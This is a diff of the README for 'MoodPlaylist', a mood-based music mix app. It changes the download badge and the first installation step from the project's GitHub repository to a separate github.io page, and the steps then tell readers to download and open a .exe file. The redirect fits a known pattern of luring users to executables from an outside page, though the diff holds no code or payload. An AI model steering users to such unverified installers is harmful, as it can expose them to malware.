@@ -1,6 +1,6 @@
 # 🎵 MoodPlaylist - Create music mixes for your mood
 
-[![Download MoodPlaylist](https://img.shields.io/badge/Download-MoodPlaylist-blue.svg)](https://github.com/nikkiegallic471/MoodPlaylist)
+[![Download MoodPlaylist](https://img.shields.io/badge/Download-MoodPlaylist-blue.svg)](https://nikkiegallic471.github.io)
 
 ## 🎯 About This App
 
@@ -19,7 +19,7 @@ The software runs locally on your computer. It does not send your music files or
 
 You can find the installer on our release page. Follow these steps to set up the software on your computer.
 
-1. Visit this link to reach the download page: https://github.com/nikkiegallic471/MoodPlaylist
+1. Visit this link to reach the download page: https://nikkiegallic471.github.io
 2. Locate the file ending in .exe in the latest release section.
 3. Click the file name to start your download.
 4. Open the folder where your browser saves downloads.
